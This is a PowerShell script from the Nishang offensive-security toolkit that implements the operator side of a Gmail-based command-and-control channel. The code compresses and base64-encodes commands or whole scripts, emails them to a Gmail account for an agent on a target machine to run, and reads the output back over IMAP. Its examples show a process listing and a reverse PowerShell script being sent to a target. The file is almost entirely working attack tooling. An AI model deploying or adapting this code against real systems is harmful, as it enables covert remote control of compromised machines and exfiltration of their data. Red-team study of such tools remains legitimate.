function Invoke-PSGcat
{
<#
.SYNOPSIS
Nishang script which can be used to send commands and scripts to Gmail which can then be run on a target using Invoke-PSGcatAgent.

.DESCRIPTION
This script is capable of sending commands and/or scripts to Gmail. A valid Gmail username and password is required.
The command is compressed and base64 encoded and sent to the Gmail account. On the target, Invoke-PsGcatAgent must be executed
which will read the last sent command/script, decode it, execute it and send the output back to Gmail.
In the Gmail security settings of that account "Access for less secure apps" must be turned on. Make sure that you use
a throw away account.

In the interactive mode, to execute a script, type "script" at the PsGcat prompt and provide full path to the script.
To read output, type "GetOutput" at the PsGcat prompt.

Currently, the output is not pretty at all and you will see the script interacting with Gmail IMAP. 

.PARAMETER Username
Username of the Gmail account you want to use. 

.PARAMETER Password
Password of the Gmail account you want to use. 

.PARAMETER AgentID
AgentID is currently unused and would be used with multiple agent support in future. 

.PARAMETER Payload
In Non-interactive mode, the PowerShell command you want to send to the Gmail account.

.PARAMETER ScriptPath
In Non-interactive mode, the PowerShell script you want to send to the Gmail account.

.PARAMETER NonInteractive
Use the non-interactive mode. Execute the provided command or payload and exit.

.PARAMETER GetOutput
Retrieve last ouput from Gmail.

.EXAMPLE
PS > Invoke-PSGcat -Username psgcatlite -password pspassword
Use GetOutput to get output.
Use Script to specify a script.
PsGcat: Get-Process
Command sent to psgcatlite@gmail.com


Above shows an example where Get-Process is sent to Gmail.

.EXAMPLE
PS > Invoke-PSGcat -Username psgcatlite -password pspassword
Use GetOutput to get output.
Use Script to specify a script.
PsGcat: GetOutput
-----Lot of IMAP text-----
* 8 FETCH (BODY[TEXT] {5206}
System.Diagnostics.Process (BTHSAmpPalService) System.Diagnostics
.Process (BTHSSecurityMgr) System.Diagnostics.Process (btplayerct
rl) System.Diagnostics.Process (capiws) System.Diagnostics.Proces
s (conhost) System.Diagnostics.Process (conhost) System.Diagnosti


Above shows how to retrieve output from Gmail. Note that the output is ugly and you may need to run GetOutput few times
before the complete output is read. Also, the Invoke-PsGcatAgent must execute the command before an output could be retrieved.


.EXAMPLE
PS > Invoke-PSGcat -Username psgcatlite -password pspassword
Use GetOutput to get output.
Use Script to specify a script.
PsGcat: script
Provide complete path to the PowerShell script.: C:\test\reverse_powershell.ps1
Command sent to psgcatlite@gmail.com
Use GetOutput to get output.


Use above to send a PowerShell script to the Gmail account. Script execution is not very reliable right now and you may see
the agent struggling to pull a big encoded script. Also, make sure that the function call for script is done from the
script itself.

.EXAMPLE
PS > Invoke-PSGcat -Username psgcatlite -password pspassword -Payload Get-Service -NonInteractive
Send a command to the Gmail account without any interaction. 

.EXAMPLE
PS > Invoke-PSGcat -Username psgcatlite -password pspassword -ScriptPath C:\test\reverse_powershell.ps1 -NonInteractive
Send a script to the Gmail account without any interaction.

.EXAMPLE
PS > Invoke-PSGcat -Username psgcatlite -password pspassword -GetOutput
Get output from the gmail account.

.LINK
http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="Interactive")] Param(

        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="Interactive")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $Username,

        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="Interactive")]
        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="Interactive")]
        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $AgentID,
        
        [Parameter(Position = 3, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $Payload,

        [Parameter(Position = 4, Mandatory = $false, ParameterSetName="NonInteractive")]
        [String]
        $ScriptPath,

        [Parameter(Mandatory = $false, ParameterSetName="NonInteractive")]
        [Switch]
        $NonInteractive,

        [Parameter(Mandatory = $false)]
        [Switch]
        $GetOutput

    )
    #$ErrorActionPreference = "SilentlyContinue"

    function SendCommand ($Payload, $Username, $Password)
    {
        
        try 
        {
            $ms = New-Object IO.MemoryStream
            $action = [IO.Compression.CompressionMode]::Compress
            $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
            $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
            $Payload | ForEach-Object {$sw.WriteLine($_)}
            $sw.Close()
    
            # Base64 encode stream
            $Compressed = [Convert]::ToBase64String($ms.ToArray())
    
            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
            $smtpserver = "smtp.gmail.com"
            $msg = new-object Net.Mail.MailMessage
            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
            $smtp.EnableSsl = $True
            $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
            $msg.From = "$username@gmail.com"
            $msg.To.Add("$username@gmail.com")

            $msg.Subject = "Command"
            $msg.Body = "##" + $Compressed
            $smtp.Send($msg)
            Write-Output "Command sent to $username@gmail.com"
        }
        catch 
        {
            Write-Warning "Something went wrong! Check if Username/Password are correct and you can connect to gmail from insecure apps." 
            Write-Error $_
        }
    }

    function ReadResponse
    {
        try 
        {
            $tcpClient = New-Object -TypeName System.Net.Sockets.TcpClient

            # Connect to gmail
            $tcpClient.Connect("imap.gmail.com", 993)

            if($tcpClient.Connected) 
            {
                # Create new SSL Stream for tcpClient
                [System.Net.Security.SslStream] $sslStream = $tcpClient.GetStream()
                
                # Authenticating as client
                $sslStream.AuthenticateAsClient("imap.gmail.com");

                if($sslStream.IsAuthenticated) 
                {
                # Asssigned the writer to stream
                [System.IO.StreamWriter] $sw = $sslstream

                # Assigned reader to stream
                [System.IO.StreamReader] $reader = $sslstream
                $script:result = ""
                $sb = New-Object System.Text.StringBuilder
                $mail =""
                $responsebuffer = [Array]::CreateInstance("byte", 2048)
                

                function ReadResponse ($command)
                {
                    $sb = New-Object System.Text.StringBuilder
                    if ($command -ne "")
                    {
                        $buf = [System.Text.Encoding]::ASCII.GetBytes($command)
                        $sslStream.Write($buf, 0, $buf.Length)
                    }
                    $sslStream.Flush()
                    $bytes = $sslStream.Read($responsebuffer, 0, 2048)
                    $str = $sb.Append([System.Text.Encoding]::ASCII.GetString($responsebuffer))
                    $sb.ToString()
                    $temp = $sb.ToString() | Select-String "\* SEARCH"
                    if ($temp)
                    {
                        $fetch = $temp.ToString() -split "\$",2
                        $tmp = $fetch[0] -split "\* SEARCH " -split " " -replace "`n"
                        [int]$mail = $tmp[-1]
                        $cmd = ReadResponse("$ FETCH $mail BODY[TEXT]`r`n", "1")
                        $cmd -replace '='
                    }
                }
                ReadResponse ""
                ReadResponse ("$ LOGIN " + "$Username@gmail.com" + " " + "$Password" + "  `r`n") | Out-Null
                ReadResponse("$ SELECT INBOX`r`n") | Out-Null
                ReadResponse("$ SEARCH SUBJECT `"Output`"`r`n")
                ReadResponse("$ LOGOUT`r`n")  | Out-Null
                } 
                else 
                {
                    Write-Error "You were not authenticated. Quitting."
                }
            } 
            else 
            {
                Write-Error "You are not connected to the host. Quitting"
            }
        }

        catch 
        {
            Write-Warning "Something went wrong! Check if Username/Password are correct, you can connect to gmail from insecure apps and if there is output email in the inbox" 
            Write-Error $_
        }
    }

    #For only reading the output.
    if ($GetOutput)
    {
        Write-Verbose "Reading Output from Gmail"
        ReadResponse ""
    }
    #Non interactive
    elseif ($NonInteractive)
    {
        #If Scriptpath is provided, read the script.
        if ($ScriptPath)
        {
            $Payload = [IO.File]::ReadAllText("$ScriptPath") -replace "`n"
            Write-Verbose "Sending Payload to $Username@gmail.com $Payload"
            SendCommand $Payload $Username $Password
        }
        #else use the command
        else
        {
            Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
            SendCommand $Payload $Username $Password
        }

    }
    #Interactive prompt
    else
    {
        while($Payload -ne "exit")
        {
            
            Write-Output "Use GetOutput to get output."
            Write-Output "Use Script to specify a script."
            $Payload = Read-Host -Prompt "PsGcat"
            if ($Payload -eq "GetOutput")
            {
                Write-Verbose "Reading Output from Gmail"
                ReadResponse ""
            }
            if ($Payload -eq "Script")
            {
                $path = Read-Host -Prompt "Provide complete path to the PowerShell script."
                $Payload = [IO.File]::ReadAllText("$path") -replace "`n"
                Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
                SendCommand $Payload $Username $Password
            }
            else
            {
                Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
                SendCommand $Payload $Username $Password
            }
        }
    }
}
    

